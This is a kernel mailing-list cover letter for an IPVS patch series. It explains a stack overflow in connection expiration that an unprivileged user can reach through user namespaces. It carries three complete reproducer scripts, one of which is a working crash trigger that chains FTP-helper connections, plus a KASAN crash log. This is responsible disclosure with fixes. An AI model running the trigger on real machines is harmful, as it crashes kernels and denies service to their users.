Received: from mail-pj2-f38.google.com (mail-pj2-f38.google.com [74.125.227.166])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 015DB45DF49
	for <lvs-devel@vger.kernel.org>; Mon,  5 Oct 2026 13:06:31 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.166
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791205594; cv=none; b=ttfOEnvOclj9Jq0P2z26hC7rbDDUgCRPywExQBP3c8vjB9KngKw54RG8+8IMfKt3OWQv5Y2DITDcthu900N+xYlT/O+wOErMPyONz0uhhUWXZ1VdSKdgsOXTE614zaw9vq4iyaRLfhf7f4bMvom4oDnQwwpgmucxWl85fpEJwC8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791205594; c=relaxed/simple;
	bh=z/dhShT/tU8khJzEd1/FPf8R31sl8Nw4EsjgxDlafW0=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=odm/1H9FV1kf3cm02bm/jNhJITar89xIABXA6qcRHBe5xMoFY2yYWA7/f2kRQPXNyundYYsm9WGaziyZhl8AQwkqTA9HEJX/IKu85I30c22OW6rxjQneuRkaLHDch6iWXXcRLF9/12bAbQYK/3bfPZZ3OtxGS3mi+Q6tuYO6zVI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=MvNlIGRn; arc=none smtp.client-ip=74.125.227.166
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="MvNlIGRn"
Received: by mail-pj2-f38.google.com with SMTP id d9443c01a7336-2e2dd05994cso5052695ad.2
        for <lvs-devel@vger.kernel.org>; Mon, 05 Oct 2026 06:06:31 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1791205591; x=1791810391; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=rBGyRWyDKB386wQE28yDgaK6VWCOqfx1gOdTQbFVsw0=;
        b=MvNlIGRnORTFkQb7US2AjnMHrtG+gjI2qLDS9Go9+pzAR6HeJElaEvtDwUa5vdUBUx
         oHaDOcQnIWL3iH/XZL4b2rT+1pd6FZJ6GD7pGX8KIGpxY0lh7FE+rni1Eklv5QRQkrHW
         tOYgZrtEtnvTfqAnCR5Y5ZL6IM0tlfShc0qw1Db7gVOSeReLqwvV9jRt+QY7nqeXlFcF
         O9Ni9l6Kb1s+BeumPGJWx4lGUUxBCkY/j8wSxoSlyDzeLp9R7+cbavKQhuOWNqnESlfZ
         NQjGAEz716sZdLuRNf3HPDuxsMq9EshvQeKoXnSedlF2+/cUadSfJucyNFdqw8dcjQSB
         ceWA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1791205591; x=1791810391;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=rBGyRWyDKB386wQE28yDgaK6VWCOqfx1gOdTQbFVsw0=;
        b=IWVwIRf250MV6gYV2+PlfocLXDv4mmwW6S2gmpowP1+/z7BBqitR0G3v8YhAvg0/Cg
         iUddNVGtPW+Bfd4ng7R1JjCh8z9O2D1Vf8EL9Hl7NLEgzZJsGXPQLmlHDoBJ4O3EQtNq
         AgnAnWOlaMTqrCfevdER8XyUTA1dDfDK9hT5U6ujEGHIHbbYsUog1V3F2CqXY0ThH2BG
         TAOUe4DkgxL7/q4VrUqEotkKF+gYxd3gQYhL1qry34najpWIjWMKBt6YXLMruO6wkSDR
         /PPpQptkODrtGxmKJa29HTLtSBNpkz5PCd0hWpTi1LSwV91Vv/VhQ1WcgZgNitvj0HHi
         RewA==
X-Gm-Message-State: AFq9FYJqGkLqiJcnyxVAphNAaahJmBNtITRp5HsVKwaCz9pJL0mJacQ9
	14rTZpi6a1rvRlKR3iqNWtEya0UyZQHjBlKwncRCck6qpA9ZyaYdZCjFXOyJrIdxUQ+byfODtvR
	0w8uvZKJAIjA=
X-Gm-Gg: AYBFou1qxH+IP30plQ/0W2MUCIWUJBJK8VLKIrLFNLEVFWMCb2pDMSnKf/uYS2T92C7
	weZBPJ8/jYlNgkAcX4GDPrFnVOKKmiEy/xe2Zos5Ng8z5fnl3Xtpp0A9LUSNNnyQQLlPw/rKhaG
	fR+EBOXGjXuPNomycMLVkaA5VC8FjZbmjRnnwErTr8udch52o9d6ubKLA/dikYzFlgC8B1w122d
	lcAZ5RJFg0ZTg/7o2sk4exG4elZ6SMEGsTnWOu5WZiP6ahItG0k8XwtNJHFp/qtWVwvKlkyyS11
	jgnG8e1nP9KBcceMhY+7QX75wWc1xE7QBGYCFFQJrEm/D3NsO41aStPe7o/HD1qi13ZwNawbaCy
	HKy6sRwNTi/LAMaB5lNY+ju880VV+6Kkj/U/ceG5FeFJwJ1VICQBFhRXCQEP1RBdBe4e+1voW5A
	49zXniI9Z1KB+rbKnCYQnzB59BenDPK3AyRGFg7kpfruD/c2bNlPcDpiY3z4qA4+JKccBBSSPOg
	10RISI5fq7FBc2GuMT/kdYfdaGgCPaIDWsRLPxk
X-Received: by 2002:a17:902:f685:b0:2dd:ad73:c983 with SMTP id d9443c01a7336-2e49b604cc3mr99968415ad.27.1791205590613;
        Mon, 05 Oct 2026 06:06:30 -0700 (PDT)
Received: from 954df21a5119.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cce6d334dd6sm785236a12.9.2026.10.05.06.06.24
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 05 Oct 2026 06:06:29 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: lvs-devel@vger.kernel.org,
	netfilter-devel@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	horms@verge.net.au,
	ja@ssi.bg,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	vega@nebusec.ai,
	root@tr0jan.top,
	zihanx@nebusec.ai
Subject: [PATCH nf v6 0/3] ipvs: avoid stack overflow from recursive connection expiration
Date: Mon,  5 Oct 2026 13:06:16 +0000
Message-ID: <cover.1791194172.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: lvs-devel@vger.kernel.org
List-Id: <lvs-devel.vger.kernel.org>
List-Subscribe: <mailto:lvs-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:lvs-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in
net/netfilter/ipvs/ip_vs_ftp.c and net/netfilter/ipvs/ip_vs_conn.c. The
bug is reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

This series contains 3 patches:

  1/3 Fix problems during IPVS connection deletion.
  2/3 Replace recursive controller expiration with an iterative cleanup
      path.
  3/3 Reject zero and configured FTP control ports as data ports.

We will provide detailed information about the bug
in this email, along with PoCs to trigger it.

---- details below ----

Bug details:

The trigger entry point is ip_vs_ftp_out() in
net/netfilter/ipvs/ip_vs_ftp.c. It parses a PASV or EPSV reply from the
real server and creates a wildcard data connection from the advertised
port. The baseline reproducer uses port 21, the default FTP control
port. ip_vs_conn_new() then binds the FTP helper to the new connection
again. Because the child has IP_VS_CONN_F_NO_CPORT, the next connection
from the same client to the VIP on port 21 matches the wildcard child
instead of creating a new top-level entry. Repeating the FTP exchange
builds a chain of controlled connections.

The active-mode entry point, ip_vs_ftp_in(), has the same chain-building
condition when the derived data port is a configured control port. The
data connection's virtual port is derived from cp->vport - 1. With
ports={21,20}, the derived port is 20, so ip_vs_conn_new() can bind the
FTP helper again.

The FTP entry points are in ip_vs_ftp.c, but the stack-overflow root
cause is in the generic cleanup path in ip_vs_conn.c. When a controlled
connection expires, ip_vs_conn_expire() can delete and expire its
controller. The old path can then call ip_vs_conn_expire() recursively.
A long controlled-connection chain can exhaust the kernel stack. The
reproduced failure occurs during network namespace teardown, but the
cleanup bug is in the generic controller-chain path, not a teardown-only
special case.

Patch 1 fixes the connection lifetime race by making the refcount account
for active users and the pending or running timer. The deletion path can
steal the pending timer reference, and controller-chain deletion is
protected by RCU. The expiration path no longer relies on a separate
timer_delete() after the reference handoff.

Patch 2 continues expiration with the controller after the current
connection has been fully cleaned up instead of recursively calling the
expiration path. The cleanup remains synchronous while using one stack
frame for the whole chain. It uses the connection-deletion fix from patch
1 for the controller handoff.

Patch 3 rejects zero and configured FTP control ports before creating
passive data connections in ip_vs_ftp_out(), covering both PASV and EPSV.
It also rejects a zero active-mode client port and a data port derived
from a configured control port in ip_vs_ftp_in(). Valid data ports
continue through the existing path.

The recursive-cleanup root cause was introduced by
f9200a52eedf ("ipvs: avoid expiring many connections from timer"). The FTP
helper's acceptance of a control port is a separate root-cause fact,
introduced by 1da177e4c3f4 ("Linux-2.6.12-rc2"). These are different
root-cause facts, so the fixes use separate Fixes: tags.

Reproducer:

The reproducers are shell scripts with embedded Python and do not
require compilation. The baseline reproducer was run as follows:

    SELF_UNSHARE=1 MODE=exit ./poc-original.sh 400

The v6 connection-cleanup validation was run as follows:

    SELF_UNSHARE=1 MODE=exit ./poc-original.sh 200

The passive-mode validation was run as follows:

    SELF_UNSHARE=1 MODE=exit ./poc.sh 200

The active-mode validation used the following kernel parameter and
command:

    ip_vs_ftp.ports=21,20
    SELF_UNSHARE=1 MODE=exit ./poc-active.sh 1

packetdrill was not used because the trigger requires namespace creation,
the legacy IPVS sockopt ABI, a cooperating TCP server, and namespace
teardown. packetdrill cannot express that complete control-plane setup
and lifetime on its own.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

The original baseline crash was collected on 70194dc37670
(7.3.0-rc2-g70194dc37670). The v6 series is based on nf/HEAD
9c572a83037a. The crash log below is retained as original trigger
evidence; it is not presented as a validation run on the v6 baseline.

The v6 connection-cleanup validation created 200 connections and 201
IPVS entries, completed namespace teardown, and reported no KASAN, BUG,
Oops, panic, stack-guard, general-protection, or refcount diagnostic.
The passive FTP validation rejected 200/200 control-port replies, kept
200 IPVS entries, and created zero passive data connections. The active
FTP validation ran with DEPTH=1 (one FTP control connection), reported
one IPVS entry before namespace teardown, and created zero derived data
connections. Both validation runs completed namespace teardown without
the listed kernel diagnostics.

The crash excerpt below is copied from the decoded baseline report.
Unrelated boot output, registers, disassembly, and local execution
paths are omitted.

Reproducer source files:

------BEGIN poc-original.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if b"EPSV" not in line.upper():
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"229 Entering Extended Passive Mode (|||21|)\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"EPSV\r\n")
        reply = recv_line(s)
        if b"229 " not in reply:
            raise RuntimeError(f"unexpected EPSV reply on level {i}: {reply!r}")
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc-original.sh--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []
rejected = 0

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if b"EPSV" not in line.upper():
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"229 Entering Extended Passive Mode (|||21|)\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"EPSV\r\n")
        s.settimeout(0.2)
        try:
            reply = recv_line(s)
        except socket.timeout:
            rejected += 1
            print(f"control-port reply rejected on level {i}", flush=True)
        else:
            raise RuntimeError(
                f"control-port reply was not rejected on level {i}: {reply!r}"
            )
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")
if rejected != depth:
    raise SystemExit(f"expected {depth} rejected replies, got {rejected}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"rejected control-port replies: {rejected}/{depth}", flush=True)
print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
if conn_lines != depth:
    raise SystemExit(
        f"expected {depth} IPVS entries, got {conn_lines}; "
        "a passive data connection was created"
    )
print(f"passive data connections created: {conn_lines - depth}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc.sh--------

------BEGIN poc-active.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if not line.upper().startswith(b"PORT "):
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"200 PORT command successful\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"PORT 198,51,100,3,4,1\r\n")
        time.sleep(0.2)
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
if conn_lines != depth:
    raise SystemExit(
        f"expected {depth} IPVS entries, got {conn_lines}; "
        "a derived data connection was created"
    )
print(f"derived data connections created: {conn_lines - depth}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc-active.sh--------

----BEGIN crash log----
[   40.621758] BUG: KASAN: stack-out-of-bounds in __unwind_start (arch/x86/kernel/unwind_orc.c:715)
[   40.621785] Write of size 112 at addr ff11000007307e98 by task kworker/u8:0/12
[   40.621785] 
[   40.621785] CPU: 1 UID: 0 PID: 12 Comm: kworker/u8:0 Not tainted 7.3.0-rc2-g70194dc37670 #1 PREEMPT(lazy) 
[   40.621785] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   40.621785] Workqueue: netns cleanup_net
[   40.621785] Call Trace:

[   40.951167] BUG: unable to handle page fault for address: ff11000011430ff4
[   40.951167] #PF: supervisor instruction fetch in kernel mode
[   40.951167] #PF: error_code(0x0011) - permissions violation
[   40.951167] PGD 6f1e067 P4D 6f1f067 PUD 6f20067 PMD 80000000114001e3 
[   40.951167] Thread overran stack, or stack corrupted
[   40.951167] Oops: Oops: 0011 [#1] SMP KASAN NOPTI
